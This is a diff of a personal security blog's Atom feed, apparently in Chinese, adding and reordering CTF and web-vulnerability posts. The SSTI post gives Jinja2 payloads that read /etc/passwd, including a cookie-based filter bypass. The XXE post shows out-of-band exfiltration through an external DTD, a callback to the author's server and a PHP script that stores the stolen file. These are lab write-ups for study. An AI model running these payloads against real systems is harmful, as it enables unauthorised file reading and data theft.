@@ -60,6 +60,24 @@
   </entry>
   
   <entry>
+    <title>服务端模板注入SSTI</title>
+    <link href="http://yoursite.com/2018/07/18/SSTI/"/>
+    <id>http://yoursite.com/2018/07/18/SSTI/</id>
+    <published>2018-07-17T16:00:00.000Z</published>
+    <updated>2018-09-07T07:36:54.094Z</updated>
+    
+    <content type="html"><![CDATA[<p>参考链接:<br><br><a href="https://www.cnblogs.com/tyomcat/p/5440488.html" target="_blank" rel="noopener">https://www.cnblogs.com/tyomcat/p/5440488.html</a><br><br><a href="https://www.jianshu.com/p/367ea79c5482" target="_blank" rel="noopener">https://www.jianshu.com/p/367ea79c5482</a><br><a id="more"></a></p><h2 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h2><p>该环境是基于python Flask框架搭建起来的</p><p>github上下载一个docker </p><p><a href="https://github.com/vulhub/vulhub/tree/master/flask/ssti" target="_blank" rel="noopener">https://github.com/vulhub/vulhub/tree/master/flask/ssti</a></p><p>具体执行命令里面有<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 拉取项目</span><br><span class="line">git clone https://github.com/vulhub/vulhub.git</span><br><span class="line">cd vulhub</span><br><span class="line"></span><br><span class="line"># 进入某一个漏洞/环境的目录</span><br><span class="line">cd flask/ssti</span><br><span class="line"></span><br><span class="line"># 自动化编译环境</span><br><span class="line">docker-compose build</span><br><span class="line"></span><br><span class="line"># 启动整个环境</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p><h2 id="0x02-原理介绍"><a href="#0x02-原理介绍" class="headerlink" title="0x02 原理介绍"></a>0x02 原理介绍</h2><p>SSTI (Server side template injection) 服务端模板注入</p><p>先来看一下主要代码:<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, request</span><br><span class="line">from jinja2 import Template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">@app.route(&quot;/&quot;)</span><br><span class="line">def index():</span><br><span class="line">    name = request.args.get(&apos;name&apos;, &apos;guest&apos;)</span><br><span class="line"></span><br><span class="line">    t = Template(&quot;Hello &quot; + name)</span><br><span class="line">    return t.render()</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br></pre></td></tr></table></figure></p><h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>name是可输入变量,template()相当于waf，对模板的过滤转义等等,所以一般xss注入是行不通的，(这里代码没太多过滤，xss是可行的，这里讲模板注入)</p><p>下面在本地进行测试几个例子<br><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102:8000/?name=1*3</span><br></pre></td></tr></table></figure></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/J~S$XN4V0Y%7B0%7BIZ814R~Q39.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102:8000/?name=&#123;&#123;1*3&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="http://p1vrkwaxt.bkt.clouddn.com/Z%7DXKPP26%7B%5D8%28GV90O1FY%28FC.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.102:8000/?name=&#123;&#123;&apos;abc&apos;.upper()&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="http://p1vrkwaxt.bkt.clouddn.com/DF%28SJ%28OVEA%7B_8PW1%5DGAV%5BOG.png" alt="image"></p><p>由此可以分析到里面代码会执行，任意命令执行的方法就出来了,这就是原理.</p><h2 id="0x03-模板注入-进阶"><a href="#0x03-模板注入-进阶" class="headerlink" title="0x03 模板注入(进阶)"></a>0x03 模板注入(进阶)</h2><p>如果开发者使用字符串格式化，来将用户输入动态地加入到模板字符串中，而不是通过render_template_string函数将URL传递进入模板内容当中,那么xss就失效了，只能用</p><h3 id="注入姿势"><a href="#注入姿势" class="headerlink" title="注入姿势"></a>注入姿势</h3><ul><li><p>内省request对象。request对象是一个Flask模板全局变量，代表“当前请求对象（flask.request）”。当你在视图中访问request对象时，它包含了你预期想看到的所有信息。</p></li><li><p>内省config对象，config对象是一个Flask模板全局变量，代表“当前配置对象（flask.config）”。</p></li><li><p>使用非常重要的内省组件： <strong>mro</strong>和<strong>subclasses</strong>属性。使用<strong>mro</strong>属性来访问对象的父类，使用<strong>subclasses</strong>属性来访问对象的子类。</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\__class__.\__mro__ &#125;&#125; 作为payload注入到SSTI漏洞点当中，</span><br></pre></td></tr></table></figure><p>使用索引1来选择object类。现在我们到达了object类，我们使用<strong>subclasses</strong>属性来dump应用程序中使用的所有类（找到file类的索引）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;.\__class__.\__mro__[1].\__subclasses__() &#125;&#125; 注入到SSTI漏洞点当中</span><br></pre></td></tr></table></figure><p><img src="http://p1vrkwaxt.bkt.clouddn.com/0~652%7BPZW@3O~V%25RBZ%25~IX1.png" alt="image">　　</p><ul><li>任意文件读取POC</li></ul><p>file类能够实例化文件对象，而且如果我们实例化了一个文件对象，那么我们就可用使用类似于read的方法来读取相关内容。</p><p>　　　　　找到file类的索引，在我的环境中<type 'file'="">类的索引是40，我们就注入</type></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;/etc/passwd&apos;).read() &#125;&#125;。</span><br></pre></td></tr></table></figure><p>具体参考我上面的链接</p><h2 id="0x04-赛题分析"><a href="#0x04-赛题分析" class="headerlink" title="0x04 赛题分析"></a>0x04 赛题分析</h2><p>因为题目的关闭，这里只能给个大概的分析</p><p>确认是SSTI漏洞，但这儿把魔术方法给拦截了,所以这个下面payload不可行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; &apos;&apos;.__class__.__mro__[2].__subclasses__()\[40](&apos;/etc/passwd&apos;).read() &#125;&#125;</span><br></pre></td></tr></table></figure><p>但也并不是毫无办法,可以写为</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;&apos;&apos;[request.cookies.a][request.cookies.b][2][request.cookies.c]()[40](&apos;/etc/passwd&apos;)[request.cookies.d]()&#125;&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">并传入四个cookiea=\__class__; b=\__mro__; c=\__subclasses__; d=read</span><br></pre></td></tr></table></figure><h2 id="0x05-总结"><a href="#0x05-总结" class="headerlink" title="0x05 总结"></a>0x05 总结</h2><p>一个很不错的姿势呢</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;参考链接:&lt;br&gt;&lt;br&gt;&lt;a href=&quot;https://www.cnblogs.com/tyomcat/p/5440488.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.cnblogs.com/tyomcat/p/5440488.html&lt;/a&gt;&lt;br&gt;&lt;br&gt;&lt;a href=&quot;https://www.jianshu.com/p/367ea79c5482&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/367ea79c5482&lt;/a&gt;&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>QCTF2018-XMan选拔赛</title>
     <link href="http://yoursite.com/2018/07/15/2018XMAN%E5%A4%8F%E4%BB%A4%E8%90%A5/"/>
     <id>http://yoursite.com/2018/07/15/2018XMAN夏令营/</id>
@@ -91,24 +109,6 @@
       &lt;h2 id=&quot;0x01-MD5加密原理&quot;&gt;&lt;a href=&quot;#0x01-MD5加密原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 MD5加密原理&quot;&gt;&lt;/a&gt;0x01 MD5加密原理&lt;/h2&gt;&lt;p&gt;简单介绍下分成下面几步&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;分组,先将二进制字符串以512位(64字节)为一组，然后再把每组分为16个子分组(每子分组32位，也就是4字节)
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>CTF常见文件头标志</title>
-    <link href="http://yoursite.com/2018/07/06/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4/"/>
-    <id>http://yoursite.com/2018/07/06/常见文件头/</id>
-    <published>2018-07-06T05:24:35.632Z</published>
-    <updated>2018-07-06T10:36:24.477Z</updated>
-    
-    <content type="html"><![CDATA[<p>在winhex下会经常看到许多十六进制码,这里深刻了解下.<br><a id="more"></a></p><ul><li>jpg/jpeg  文件头:FF D8 FF</li><li>png       文件头:89 50 4E 47 0D</li><li>gif       文件头:47 49 46 38 39</li><li>zip       文件头:50 4B 03 04 14</li><li>rar       文件头:52 61 72 21 1A</li><li>bmp       文件头:42 4D 36 5D 3D</li><li>mp3       文件头:49 44 33 03 00</li><li>wav       文件头:52 49 46 46 18</li></ul><p><a href="https://www.cnblogs.com/WangAoBo/p/6366211.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/6366211.html</a><br><br><br><a href="https://www.cnblogs.com/sch01ar/p/8232084.html" target="_blank" rel="noopener">https://www.cnblogs.com/sch01ar/p/8232084.html</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;在winhex下会经常看到许多十六进制码,这里深刻了解下.&lt;br&gt;
     
     </summary>
     
@@ -154,6 +154,24 @@
   </entry>
   
   <entry>
+    <title>CTF常见文件头标志</title>
+    <link href="http://yoursite.com/2018/07/06/%E5%B8%B8%E8%A7%81%E6%96%87%E4%BB%B6%E5%A4%B4/"/>
+    <id>http://yoursite.com/2018/07/06/常见文件头/</id>
+    <published>2018-07-06T05:24:35.632Z</published>
+    <updated>2018-07-06T10:36:24.477Z</updated>
+    
+    <content type="html"><![CDATA[<p>在winhex下会经常看到许多十六进制码,这里深刻了解下.<br><a id="more"></a></p><ul><li>jpg/jpeg  文件头:FF D8 FF</li><li>png       文件头:89 50 4E 47 0D</li><li>gif       文件头:47 49 46 38 39</li><li>zip       文件头:50 4B 03 04 14</li><li>rar       文件头:52 61 72 21 1A</li><li>bmp       文件头:42 4D 36 5D 3D</li><li>mp3       文件头:49 44 33 03 00</li><li>wav       文件头:52 49 46 46 18</li></ul><p><a href="https://www.cnblogs.com/WangAoBo/p/6366211.html" target="_blank" rel="noopener">https://www.cnblogs.com/WangAoBo/p/6366211.html</a><br><br><br><a href="https://www.cnblogs.com/sch01ar/p/8232084.html" target="_blank" rel="noopener">https://www.cnblogs.com/sch01ar/p/8232084.html</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;p&gt;在winhex下会经常看到许多十六进制码,这里深刻了解下.&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>PHP %00截断原理</title>
     <link href="http://yoursite.com/2018/07/06/%E6%88%AA%E6%96%AD%E9%97%AE%E9%A2%98/"/>
     <id>http://yoursite.com/2018/07/06/截断问题/</id>
@@ -165,6 +183,24 @@
     <summary type="html">
     
       &lt;p&gt;这里有篇不错的文章&lt;br&gt;&lt;br&gt;
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
+    <title>文件源码泄漏大全</title>
+    <link href="http://yoursite.com/2018/07/06/yuanma/"/>
+    <id>http://yoursite.com/2018/07/06/yuanma/</id>
+    <published>2018-07-06T05:24:35.617Z</published>
+    <updated>2018-07-06T10:44:24.257Z</updated>
+    
+    <content type="html"><![CDATA[<h4 id="2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。"><a href="#2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。" class="headerlink" title="2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。"></a>2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。</h4><h3 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br><a id="more"></a><br> <a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">原理链接+工具链接</a></p><h3 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h3><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。<br>如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p><p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">原理链接+工具链接</a></p><h3 id="swp源码泄漏"><a href="#swp源码泄漏" class="headerlink" title=".swp源码泄漏"></a>.swp源码泄漏</h3><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><h4 id="vim临时文件"><a href="#vim临时文件" class="headerlink" title="vim临时文件"></a>vim临时文件</h4><p>程序员使用vim编辑器编写index.php文件时，会有一个.index.php.swp文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php。</p><p>2017年的东华杯出现过类似的题目</p><h3 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h3><p>默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看；<br>例如：<br>index.php的备份文件则为index.php~</p><p>还有很多，以后慢慢补上</p><p><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="noopener">参考链接</a></p><p><a href="https://yangzcc.github.io/2017/12/26/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/" target="_blank" rel="noopener">朋友链接</a></p><h3 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h3><p>发现一个很不错的检测源码泄漏工具 php代码泄露检测<br><a href="https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true" target="_blank" rel="noopener">php代码泄露检测工具</a></p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h4 id=&quot;2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。&quot;&gt;&lt;a href=&quot;#2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。&quot; class=&quot;headerlink&quot; title=&quot;2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。&quot;&gt;&lt;/a&gt;2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。&lt;/h4&gt;&lt;h3 id=&quot;git源码泄漏&quot;&gt;&lt;a href=&quot;#git源码泄漏&quot; class=&quot;headerlink&quot; title=&quot;.git源码泄漏&quot;&gt;&lt;/a&gt;.git源码泄漏&lt;/h3&gt;&lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。&lt;br&gt;
     
     </summary>
     
@@ -192,17 +228,18 @@
   </entry>
   
   <entry>
-    <title>chrome 代理设置ss(ssr)</title>
-    <link href="http://yoursite.com/2018/07/06/%E5%85%B3%E4%BA%8ESSR%E9%85%8D%E7%BD%AE/"/>
-    <id>http://yoursite.com/2018/07/06/关于SSR配置/</id>
+    <title>xxe漏洞的复现解析</title>
+    <link href="http://yoursite.com/2018/07/06/xxe%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    <id>http://yoursite.com/2018/07/06/xxe漏洞复现/</id>
     <published>2018-07-06T05:24:35.617Z</published>
-    <updated>2018-07-06T10:36:53.625Z</updated>
+    <updated>2018-07-06T10:44:20.273Z</updated>
     
-    <content type="html"><![CDATA[<p>参考链接:<a href="https://www.jianshu.com/p/4c0553dbc970" target="_blank" rel="noopener">https://www.jianshu.com/p/4c0553dbc970</a><br><a id="more"></a></p><p>先看这个吧，害怕三连.jpg</p>]]></content>
+    <content type="html"><![CDATA[<p>参考链接:<a href="https://www.jianshu.com/p/163879fc1018" target="_blank" rel="noopener">https://www.jianshu.com/p/163879fc1018</a></p><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>当XML文件中出现关键字”SYSTEM”定义的“实体”（DOCTYPE头部标签中会呈现），便可通过XML文件中定义的’实体’ , 访问本地或者远程的内容。这时候，XML解析器在SYSTEM的作用下从URI中读取内容，并允许它在XML文档中被替换，从而造成外部实体攻击。此时，Web应用如果产生数据回显，则会将URL中的数据呈现在应用界面上。<br>而如果Web端注意到这一点，没有设置回显，那么攻击者可以将数据通过外数据通道发送到攻击者服务器，从而达到攻击效果。<br><a id="more"></a></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>这里用phpstudy以及自己的服务器进行搭建环境</p><p>首先本地根目录下写两个文件</p><p>test.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$xml=&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line"> &lt;!ENTITY milin SYSTEM &quot;file:///D:/phpStudy/PHPTutorial/WWW/pwd.txt&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;a&gt;&amp;milin;&lt;/a&gt;</span><br><span class="line">EOF;</span><br><span class="line">$data = simplexml_load_string($xml);</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>pwd.txt</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">21212121(任意都可以,假设这个文本是攻击者想要的内容)</span><br></pre></td></tr></table></figure><ul><li>&lt;&lt;&lt;EOF ….. EOF; 这中间不对敏感字符进行转义</li><li>simplexml_load_string()函数:转换形式良好的 XML 字符串为 SimpleXMLElement 对象，然后输出对象的键和元素</li></ul><p>然后访问本地文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php</span><br></pre></td></tr></table></figure></p><p><img src="http://p1vrkwaxt.bkt.clouddn.com/%28X5A%25L5JMQQ5@HX4K%5D%7DBP0M.png" alt="image"></p><p>可以看到pwd.txt的文件成功地被读取了出来</p><h2 id="无回显的情况"><a href="#无回显的情况" class="headerlink" title="无回显的情况"></a>无回显的情况</h2><p>但是如果没有回显，即没有print_r($data),这样就没法读取到pwd.txt了，这里的办法是将回显数据通过外数据通道发送到另一个服务器</p><p>这里联系自己的服务器进行攻击</p><p>test.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$xml=&lt;&lt;&lt;EOF</span><br><span class="line">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE ANY[</span><br><span class="line"> &lt;!ENTITY % file SYSTEM &quot;file:///D:/phpStudy/PHPTutorial/WWW/pwd.txt&quot;&gt;</span><br><span class="line"> &lt;!ENTITY % xml SYSTEM &quot;http://服务器_IP/milin.xml&quot;&gt;</span><br><span class="line">%xml;</span><br><span class="line">%send;</span><br><span class="line">]&gt;</span><br><span class="line">EOF;</span><br><span class="line">$data = simplexml_load_string($xml);</span><br><span class="line">print_r($data);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>然后在自己的服务器放个milin.xml文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all</span><br><span class="line">&quot;&lt;!ENTITY &amp;#x25; send SYSTEM &apos;http://服务器_IP/get.php?file=%file;&apos;&gt;&quot;</span><br><span class="line">&gt;</span><br><span class="line">%all;</span><br></pre></td></tr></table></figure></p><p>然后为了接受这个文件的数据，再构造一个get.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">file_put_contents(&quot;key.txt&quot;, $_GET[&apos;file&apos;]) ; </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>最后访问URL模拟攻击:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/test.php</span><br></pre></td></tr></table></figure></p><p>会发现在自己的服务器目录生成了一个key.txt,里面内容为你本地的pwd.txt</p><h2 id="遇到的一些无法复现的问题"><a href="#遇到的一些无法复现的问题" class="headerlink" title="遇到的一些无法复现的问题"></a>遇到的一些无法复现的问题</h2><p><img src="http://p1vrkwaxt.bkt.clouddn.com/7F6003B4ACBF683F4BE602542DAD0CF6.png" alt="image"></p><p>我也遇到了这个函数的问题，但切换版本总是一样结果，后来把phpstudy删了重装结果好了= =</p>]]></content>
     
     <summary type="html">
     
-      &lt;p&gt;参考链接:&lt;a href=&quot;https://www.jianshu.com/p/4c0553dbc970&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/4c0553dbc970&lt;/a&gt;&lt;br&gt;
+      &lt;p&gt;参考链接:&lt;a href=&quot;https://www.jianshu.com/p/163879fc1018&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/163879fc1018&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&quot;漏洞原理&quot;&gt;&lt;a href=&quot;#漏洞原理&quot; class=&quot;headerlink&quot; title=&quot;漏洞原理&quot;&gt;&lt;/a&gt;漏洞原理&lt;/h2&gt;&lt;p&gt;当XML文件中出现关键字”SYSTEM”定义的“实体”（DOCTYPE头部标签中会呈现），便可通过XML文件中定义的’实体’ , 访问本地或者远程的内容。这时候，XML解析器在SYSTEM的作用下从URI中读取内容，并允许它在XML文档中被替换，从而造成外部实体攻击。此时，Web应用如果产生数据回显，则会将URL中的数据呈现在应用界面上。&lt;br&gt;而如果Web端注意到这一点，没有设置回显，那么攻击者可以将数据通过外数据通道发送到攻击者服务器，从而达到攻击效果。&lt;br&gt;
     
     </summary>
     
@@ -228,24 +265,6 @@
   </entry>
   
   <entry>
-    <title>文件源码泄漏大全</title>
-    <link href="http://yoursite.com/2018/07/06/yuanma/"/>
-    <id>http://yoursite.com/2018/07/06/yuanma/</id>
-    <published>2018-07-06T05:24:35.617Z</published>
-    <updated>2018-07-06T10:44:24.257Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。"><a href="#2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。" class="headerlink" title="2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。"></a>2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。</h4><h3 id="git源码泄漏"><a href="#git源码泄漏" class="headerlink" title=".git源码泄漏"></a>.git源码泄漏</h3><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。<br><a id="more"></a><br> <a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">原理链接+工具链接</a></p><h3 id="DS-Store文件泄漏"><a href="#DS-Store文件泄漏" class="headerlink" title=".DS_Store文件泄漏"></a>.DS_Store文件泄漏</h3><h3 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h3><p>.DS_Store是Mac下Finder用来保存如何展示 文件/文件夹 的数据文件，每个文件夹下对应一个。<br>如果开发/设计人员将.DS_Store上传部署到线上环境，可能造成文件目录结构泄漏，特别是备份文件、源代码文件。</p><p><a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">原理链接+工具链接</a></p><h3 id="swp源码泄漏"><a href="#swp源码泄漏" class="headerlink" title=".swp源码泄漏"></a>.swp源码泄漏</h3><h3 id="原理-2"><a href="#原理-2" class="headerlink" title="原理"></a>原理</h3><h4 id="vim临时文件"><a href="#vim临时文件" class="headerlink" title="vim临时文件"></a>vim临时文件</h4><p>程序员使用vim编辑器编写index.php文件时，会有一个.index.php.swp文件，如果文件正常退出，则该文件被删除，如果异常退出，该文件则会保存下来，该文件可以用来恢复异常退出的index.php。</p><p>2017年的东华杯出现过类似的题目</p><h3 id="vim备份文件"><a href="#vim备份文件" class="headerlink" title="vim备份文件"></a>vim备份文件</h3><p>默认情况下使用Vim编程，在修改文件后系统会自动生成一个带~的备份文件，某些情况下可以对其下载进行查看；<br>例如：<br>index.php的备份文件则为index.php~</p><p>还有很多，以后慢慢补上</p><p><a href="http://www.s2.sshz.org/post/source-code-leak/" target="_blank" rel="noopener">参考链接</a></p><p><a href="https://yangzcc.github.io/2017/12/26/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/" target="_blank" rel="noopener">朋友链接</a></p><h3 id="备份文件泄露"><a href="#备份文件泄露" class="headerlink" title="备份文件泄露"></a>备份文件泄露</h3><p>发现一个很不错的检测源码泄漏工具 php代码泄露检测<br><a href="https://coding.net/u/yihangwang/p/SourceLeakHacker/git?public=true" target="_blank" rel="noopener">php代码泄露检测工具</a></p>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。&quot;&gt;&lt;a href=&quot;#2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。&quot; class=&quot;headerlink&quot; title=&quot;2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。&quot;&gt;&lt;/a&gt;2018年从一个朋友学到了很多，决定总结一下内容，以下内容纯属借鉴，请勿抄袭。&lt;/h4&gt;&lt;h3 id=&quot;git源码泄漏&quot;&gt;&lt;a href=&quot;#git源码泄漏&quot; class=&quot;headerlink&quot; title=&quot;.git源码泄漏&quot;&gt;&lt;/a&gt;.git源码泄漏&lt;/h3&gt;&lt;h3 id=&quot;原理&quot;&gt;&lt;a href=&quot;#原理&quot; class=&quot;headerlink&quot; title=&quot;原理&quot;&gt;&lt;/a&gt;原理&lt;/h3&gt;&lt;p&gt;在运行git init初始化代码库的时候，会在当前目录下面产生一个.git的隐藏文件，用来记录代码的变更记录等等。在发布代码的时候，把.git这个目录没有删除，直接发布了。使用这个文件，可以用来恢复源代码。&lt;br&gt;
-    
-    </summary>
-    
-    
-  </entry>
-  
-  <entry>
     <title>网络安全实验室-注入关</title>
     <link href="http://yoursite.com/2018/07/06/wangluo3/"/>
     <id>http://yoursite.com/2018/07/06/wangluo3/</id>
@@ -257,6 +276,24 @@
     <summary type="html">
     
